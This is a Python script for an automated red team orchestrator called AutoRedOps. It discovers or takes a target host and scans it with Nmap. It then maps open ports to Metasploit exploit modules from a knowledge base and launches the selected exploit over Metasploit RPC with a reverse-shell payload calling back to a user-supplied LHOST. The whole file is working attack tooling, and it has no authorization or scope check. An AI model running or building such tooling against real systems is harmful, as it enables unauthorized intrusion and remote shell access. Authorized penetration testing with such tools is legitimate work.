import yaml
import sys
from scanner_nmap import NmapScanner
from msf_rpc import MetasploitRPC
from reporter import Reporter

class AutoRedOps:
    def __init__(self):
        # Load Config
        try:
            with open('config.yaml', 'r') as f:
                self.config = yaml.safe_load(f)
            with open('knowledge_base.yml', 'r') as f:
                self.kb = yaml.safe_load(f)
        except FileNotFoundError:
            print("[-] Error: config.yaml or knowledge_base.yml not found!")
            sys.exit(1)

        # Initialize Modules
        self.scanner = NmapScanner()
        try:
            self.rpc = MetasploitRPC()
            self.rpc_available = True
        except Exception as e:
            print(f"[-] Warning: Could not connect to Metasploit: {e}")
            print("[-] Exploitation features will be disabled.")
            self.rpc_available = False
            
        self.reporter = Reporter(self.config)

    def plan_attacks(self, scan_results):
        """
        Matches open ports/services to the Knowledge Base.
        """
        possible_attacks = []
        print("\n[*] Analyzing targets against Knowledge Base...")
        
        for port_info in scan_results['ports']:
            # Check every exploit in the KB
            for exploit in self.kb['exploit_mappings']:
                # Match by Port
                if exploit.get('target_port') == int(port_info['port']):
                    possible_attacks.append({
                        'name': exploit['description'],
                        'module': exploit['msf_module'],
                        'payload': exploit['payload'],
                        'port': port_info['port'],
                        'service': port_info['service']
                    })
                    
        return possible_attacks

    def run(self):
        print("=== AutoRedOps: Automated Red Team Orchestrator ===")
        
        # 1. Target Selection
        target = input("\nEnter Target IP (leave blank to auto-discover): ").strip()
        
        if not target:
            hosts = self.scanner.discover_hosts()
            if not hosts:
                print("[-] No hosts found.")
                return
            print("\nDiscovered Hosts:")
            for i, host in enumerate(hosts):
                print(f"[{i}] {host}")
            choice = int(input("Select host number: "))
            target = hosts[choice]

        # 2. Scanning
        scan_data = self.scanner.scan_target(target)
        
        # 3. Attack Planning
        attacks = self.plan_attacks(scan_data)
        
        exploit_result = None
        
        if attacks and self.rpc_available:
            print(f"\n[+] Identified {len(attacks)} potential attack vectors:")
            for i, attack in enumerate(attacks):
                print(f"[{i+1}] {attack['name']} ({attack['module']})")
            
            print("[0] Skip Exploitation")
            
            choice = int(input("\nSelect attack to execute: "))
            
            if choice > 0:
                selected_attack = attacks[choice-1]
                # Prepare data for RPC
                exploit_data = {
                    'msf_module': selected_attack['module'],
                    'payload': selected_attack['payload'],
                    'target_port': int(selected_attack['port'])
                }
                
                # We need our local IP (LHOST) for the reverse shell
                lhost = input("Enter your LHOST (your local IP for reverse shell): ")
                
                # Execute
                exploit_result = self.rpc.execute_exploit(exploit_data, target, lhost)
                exploit_result['module'] = selected_attack['module']
        
        # 4. Reporting
        self.reporter.generate_report(scan_data, exploit_result)
        print("\n[*] Mission Complete.")

if __name__ == "__main__":
    app = AutoRedOps()
    app.run()